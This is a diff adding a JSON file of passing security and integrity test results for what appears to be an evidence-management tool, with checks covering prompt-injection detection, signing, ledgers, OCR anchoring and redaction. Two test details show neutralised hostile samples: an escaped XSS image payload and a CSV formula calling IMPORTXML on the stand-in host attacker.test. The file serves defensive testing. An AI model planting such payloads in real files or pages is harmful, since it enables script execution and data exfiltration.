@@ -1,0 +1,384 @@
+{
+  "generatedAt": "2026-06-17T00:13:10.790Z",
+  "passed": true,
+  "results": [
+    {
+      "id": "prompt_injection_document",
+      "category": "model_safety",
+      "passed": true,
+      "detail": "5 injection finding(s) detected"
+    },
+    {
+      "id": "prompt_injection_auto_suggest_quarantine",
+      "category": "model_safety",
+      "passed": true,
+      "detail": "Security review: 2 possible source-borne instructions detected. Source text is evidence, never instruction. Automatic evidence suggestions were skipped for this record."
+    },
+    {
+      "id": "obfuscated_prompt_injection",
+      "category": "model_safety",
+      "passed": true,
+      "detail": "2 finding(s) after leetspeak/homoglyph normalization"
+    },
+    {
+      "id": "poisoned_email_thread",
+      "category": "model_safety",
+      "passed": true,
+      "detail": "4 injection finding(s) in a multi-message email thread"
+    },
+    {
+      "id": "adversarial_transcript_speaker",
+      "category": "model_safety",
+      "passed": true,
+      "detail": "2 injection finding(s) in a meeting transcript line"
+    },
+    {
+      "id": "unverified_export_attempt",
+      "category": "packet_integrity",
+      "passed": true,
+      "detail": "cited card blocked"
+    },
+    {
+      "id": "duplicate_card_packet_attempt",
+      "category": "packet_integrity",
+      "passed": true,
+      "detail": "packet hard wall: selected card is duplicated"
+    },
+    {
+      "id": "hash_manifest_verification",
+      "category": "packet_integrity",
+      "passed": true,
+      "detail": "manifest verified against source graph; page drift page hashes mismatch"
+    },
+    {
+      "id": "cryptographic_manifest_signature",
+      "category": "packet_integrity",
+      "passed": true,
+      "detail": "signature verified for sha256:e6130bdc736410b5312d61389f14f51b9cfb5608fd4444bd23222cab7503d363; malformed/timestamp attacks blocked"
+    },
+    {
+      "id": "packet_signer_trust_registry",
+      "category": "packet_integrity",
+      "passed": true,
+      "detail": "trusted signer accepted (13B4 EF7E 0024...); unknown signer pinned out"
+    },
+    {
+      "id": "encrypted_signing_key_custody",
+      "category": "packet_integrity",
+      "passed": true,
+      "detail": "wrapped custody verified for sha256:4be10d1b0ded574bdbc6b3883c6cd79aa9e1827509b6106218aa6562a0359ba1; custody hash signed and tamper blocked"
+    },
+    {
+      "id": "kdf_iteration_bounds",
+      "category": "privacy_redaction",
+      "passed": true,
+      "detail": "floor enforced, ceiling enforced"
+    },
+    {
+      "id": "encrypted_signing_key_recoverable",
+      "category": "packet_integrity",
+      "passed": true,
+      "detail": "custody confirms key is recoverable; wrong passphrase rejected"
+    },
+    {
+      "id": "legacy_bridge_no_self_anchor",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "fabricated legacy quote downgraded and blocked"
+    },
+    {
+      "id": "stale_anchor_packet_attempt",
+      "category": "ocr_anchoring",
+      "passed": true,
+      "detail": "anchor_stale card blocked"
+    },
+    {
+      "id": "card_anchor_reference_integrity",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "packet hard wall: card page and span page disagree"
+    },
+    {
+      "id": "stale_char_range_anchor",
+      "category": "ocr_anchoring",
+      "passed": true,
+      "detail": "packet hard wall: source span text is not backed by page text or media/geometry anchor"
+    },
+    {
+      "id": "unbacked_span_packet_attempt",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "span without page text or geometry was blocked"
+    },
+    {
+      "id": "verification_workbench_unbacked_diagnostic",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "packet hard wall: source span text is not backed by page text or media/geometry anchor"
+    },
+    {
+      "id": "verification_dossier_inspection_target",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "doc_a/page_a_1/span_a_1"
+    },
+    {
+      "id": "workbench_signoff_fail_closed_and_stale",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "stale-anchor signoff blocked; invalid/tampered signoff blocked; verified signoff is stale-detectable after a source change"
+    },
+    {
+      "id": "workbench_promotion_certificate_binds_inspection",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "promotion certificate verified, ledger accepted it, blocked inspection tamper, and went stale after page proof drift"
+    },
+    {
+      "id": "workbench_reanchor_binds_backing_text",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "backing text drift stales signoff; reanchor recovers to cited; disputed evidence cannot be reanchored"
+    },
+    {
+      "id": "signoff_audit_stale_sweep",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "audit reports 0 stale when fresh, 1 stale after a source change"
+    },
+    {
+      "id": "workbench_split_narrows_within_source",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "split rejects out-of-source sub-quotes; children stay source-backed and revert to cited"
+    },
+    {
+      "id": "workbench_merge_same_source_only",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "merge refuses cross-source consolidation; same-source merge stays source-backed and reverts to cited"
+    },
+    {
+      "id": "signoff_review_queue_latest_per_card",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "review queue keeps the latest signoff per card and flags it stale after a source change"
+    },
+    {
+      "id": "forensic_bundle_signoff_provenance",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "fresh reviewer signoff and promotion provenance verify; stale source proof blocks bundle verification"
+    },
+    {
+      "id": "workbench_edit_quote_stays_in_source",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "quote edit rejects text not in the source span; valid edit stays source-backed and reverts to cited"
+    },
+    {
+      "id": "ocr_drift_reanchor",
+      "category": "ocr_anchoring",
+      "passed": true,
+      "detail": "reanchored with token_window_match at score 0.73"
+    },
+    {
+      "id": "fake_citation_chain",
+      "category": "model_safety",
+      "passed": true,
+      "detail": "card span does not exist"
+    },
+    {
+      "id": "model_candidate_reference_integrity",
+      "category": "model_safety",
+      "passed": true,
+      "detail": "card page and span page disagree; model confidence must be between 0 and 1; model output duplicate candidate id; model output duplicate candidate id; model candidates cannot be accepted for verified-only packet destinations"
+    },
+    {
+      "id": "duplicate_records",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "1 duplicate content hash bucket(s) found"
+    },
+    {
+      "id": "bitemporal_contradiction_detection",
+      "category": "graph_logic",
+      "passed": true,
+      "detail": "1 source-span-classified contradiction(s) detected"
+    },
+    {
+      "id": "claim_issue_theory_source_chain_gate",
+      "category": "graph_logic",
+      "passed": true,
+      "detail": "packet-ready claim repeats supporting card card_verified; ready issue theory strongest path failed: packet hard wall: card is cited, not verified; ready issue theory references suggested claim claim_suggested_ready; ready issue theory support failed: packet hard wall: card is cited, not verified; ready issue theory repeats claim claim_duplicate_support; ready issue theory repeats strongest-path card card_verified; ready issue theory strongest path references missing card card_missing"
+    },
+    {
+      "id": "sourcestack_forensic_bundle_tamper",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "bundle verified sha256:726ddc503241d323f22ef88e099eb86cf05e4c2f0c5955f18e93f7327553adf0; 1 invariant failure(s); 1 packet manifest(s); signed embedded manifest verified"
+    },
+    {
+      "id": "forensic_bundle_includes_artifact_and_ledger",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "1 artifact(s), 3 trust event(s), 1 case artifact(s), 1 packet manifest(s), signed ledger head present, forged verification blocked, detached graph blocked, missing artifact blocked"
+    },
+    {
+      "id": "source_artifact_case_store_custody",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "case artifact artifact:sha256:c37117c86a5bb78f32d2e2dc2dacc2c94443751cb0ff187a1835269b6fbdf28c verified, alias blocked: artifact store key mismatch/artifact id content hash mismatch, tamper blocked: artifact byte length mismatch"
+    },
+    {
+      "id": "durable_artifact_payload_tamper",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "artifact byte length mismatch"
+    },
+    {
+      "id": "append_only_quarantine_verification_audit",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "event previous hash mismatch; duplicate case event id; import quarantine event did not disable auto-suggest; evidence signoff event missing or invalid proof hash; evidence split event missing matching sub-quotes; event timestamp moved backwards"
+    },
+    {
+      "id": "signed_ledger_head_forgery",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "clean ledger signed; re-chained forgery rejected (case ledger head hash mismatch)"
+    },
+    {
+      "id": "durable_source_artifact_geometry",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "block quad outside page bounds; source artifact id mismatch; artifact page id mismatch; duplicate artifact page id; duplicate artifact page index; duplicate artifact block id; full-text collision blocked"
+    },
+    {
+      "id": "geometry_within_bounds_tamper",
+      "category": "ocr_anchoring",
+      "passed": true,
+      "detail": "page geometry hash mismatch"
+    },
+    {
+      "id": "geometry_only_backing_requires_media",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "floating quad blocked; sha256 page-image backing allowed"
+    },
+    {
+      "id": "source_vault_original_and_page_media_custody",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "1 page image(s); source vault record missing from store; source vault stored record metadata mismatch; source vault blob content hash mismatch; source vault blob record id mismatch; page image record id mismatch; duplicate source vault record id; duplicate rendered page image id"
+    },
+    {
+      "id": "encrypted_source_vault_at_rest",
+      "category": "privacy_redaction",
+      "passed": true,
+      "detail": "payload sealed at rest; storage verified; wrong passphrase blocked"
+    },
+    {
+      "id": "source_vault_local_state_redacts_payloads",
+      "category": "privacy_redaction",
+      "passed": true,
+      "detail": "payloads stripped; custody hash retained; verifier fails closed: source vault blob byte length mismatch"
+    },
+    {
+      "id": "ocr_vault_job_gate",
+      "category": "ocr_anchoring",
+      "passed": true,
+      "detail": "1 job(s); wrong media blocked; bad geometry blocked; duplicate block blocked; reserved block blocked; hostile OCR quarantined_prompt_injection"
+    },
+    {
+      "id": "legacy_bridge_preserves_artifact_hash",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "bridge used sha256:cc5acce5b37bec2ab5e362e860a4bde81848fbca4c07b74d476df7c22e8fb245"
+    },
+    {
+      "id": "redaction_leak_scan",
+      "category": "privacy_redaction",
+      "passed": true,
+      "detail": "5 token(s), 0 residual leak(s)"
+    },
+    {
+      "id": "redaction_extended_pii_classes",
+      "category": "privacy_redaction",
+      "passed": true,
+      "detail": "3 token(s) across 3 PII categories (street/card/name)"
+    },
+    {
+      "id": "redaction_hard_wall_manual_drift",
+      "category": "privacy_redaction",
+      "passed": true,
+      "detail": "manual:Jane Doe"
+    },
+    {
+      "id": "redacted_packet_source_artifact_dump",
+      "category": "privacy_redaction",
+      "passed": true,
+      "detail": "3 source leak(s) blocked"
+    },
+    {
+      "id": "malformed_model_output",
+      "category": "model_safety",
+      "passed": true,
+      "detail": "model output missing source references required by job contract"
+    },
+    {
+      "id": "packet_html_escape",
+      "category": "packet_integrity",
+      "passed": true,
+      "detail": "&lt;img src=x onerror=&quot;alert(1)&quot;&gt;"
+    },
+    {
+      "id": "csv_formula_neutralization",
+      "category": "packet_integrity",
+      "passed": true,
+      "detail": "\"'=IMPORTXML(\"\"https://attacker.test\"\",\"\"//x\"\")\""
+    },
+    {
+      "id": "local_only_frontier_block",
+      "category": "model_safety",
+      "passed": true,
+      "detail": "privacy mode local_only blocks frontier lane and no permitted local/deterministic lane is available"
+    },
+    {
+      "id": "live_mode_verified_only",
+      "category": "live_mode",
+      "passed": true,
+      "detail": "1 verified live suggestion(s) surfaced; malformed options 1; negative limit 0"
+    },
+    {
+      "id": "live_mode_current_signoff_required",
+      "category": "live_mode",
+      "passed": true,
+      "detail": "fresh 1; stale 0"
+    },
+    {
+      "id": "ledger_head_trusted_key_pin",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "ledger head accepted for a trusted signer, rejected for an untrusted one"
+    },
+    {
+      "id": "artifact_span_honest_quad",
+      "category": "ocr_anchoring",
+      "passed": true,
+      "detail": "cross-block quote claims no quad; in-block quote keeps its quad"
+    },
+    {
+      "id": "command_search_filters_bound_source_tree",
+      "category": "source_integrity",
+      "passed": true,
+      "detail": "command filters bound source candidates; tier middle"
+    },
+    {
+      "id": "cli_intelligence_cannot_invent_candidates",
+      "category": "model_safety",
+      "passed": true,
+      "detail": "CLI intelligence can rank known candidates but rejects fabricated candidate IDs"
+    }
+  ]
+}
